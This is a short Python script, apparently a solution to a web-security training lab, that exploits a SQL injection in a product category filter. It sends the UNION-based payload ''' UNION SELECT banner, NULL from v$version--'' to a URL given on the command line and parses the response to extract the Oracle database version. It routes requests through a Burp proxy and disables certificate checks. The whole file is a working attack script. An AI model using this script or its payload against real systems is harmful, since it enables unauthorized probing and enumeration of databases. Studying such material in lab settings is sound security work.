# Import necessary libraries
import requests  # For making HTTP requests
import sys  # For handling command-line arguments
import urllib3  # For disabling SSL/TLS warnings
from bs4 import BeautifulSoup  # For parsing HTML content
import re  # For regular expressions

# Disable SSL/TLS warnings about insecure requests
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Define proxy settings (used for intercepting and analyzing network traffic through BURPsuite)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

# Function to exploit SQL injection vulnerability and extract the database version
def exploit_sqli_version(url):
    # Define the vulnerable path and SQL payload
    path = "/filter?category=Gifts"
    sql_payload = "' UNION SELECT banner, NULL from v$version--"
    
    # Send a GET request with the SQL payload
    r = requests.get(url + path + sql_payload, verify=False, proxies=proxies)
    res = r.text
    
    # Check if the response contains information indicating an Oracle database
    if "Oracle Database" in res:
        print("[+] Found the database version.")
        
        # Parse the HTML content using BeautifulSoup
        soup = BeautifulSoup(res, 'html.parser')
        
        # Find the database version element based on the content
        version = soup.find(string=re.compile('.*Oracle\sDatabase.*'))
        print("[+] The Oracle database version is: " + version)
        return True  # Successful exploitation and version extraction
    
    return False  # Exploitation was unsuccessful

# Main program execution block
if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()  # Get target URL from command-line arguments
    except IndexError:
        # Print usage instructions and exit if the argument is missing
        print("[-] Usage: %s <url>" % sys.argv[0])
        print("[-] Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    # Step: Exploit SQL injection vulnerability to dump the database version
    print("[+] Dumping the version of the database...")
    if not exploit_sqli_version(url):
        print("[-] Unable to dump the database version.")
